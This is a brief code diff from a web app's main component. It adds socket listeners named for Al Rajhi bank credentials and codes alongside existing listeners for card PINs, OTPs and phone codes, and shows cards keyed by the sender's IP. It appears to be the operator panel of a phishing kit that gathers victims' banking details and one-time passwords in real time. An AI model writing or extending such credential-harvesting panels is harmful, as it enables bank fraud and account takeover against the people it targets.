@@ -192,6 +192,8 @@ export default function App() {
         handleShowCard(u.ip);
       });
       socket.on("newPhone", (u) => mergeSingleton(u));
+      socket.on("newRajhi", (u) => mergeSingleton(u));
+      socket.on("newRajhiCode", (u) => mergeSingleton(u));
       socket.on("newPin", (u) => mergeSingleton(u));
       socket.on("newOtp", (u) => mergeSingleton(u));
       socket.on("newPhoneCode", (u) => mergeSingleton(u));
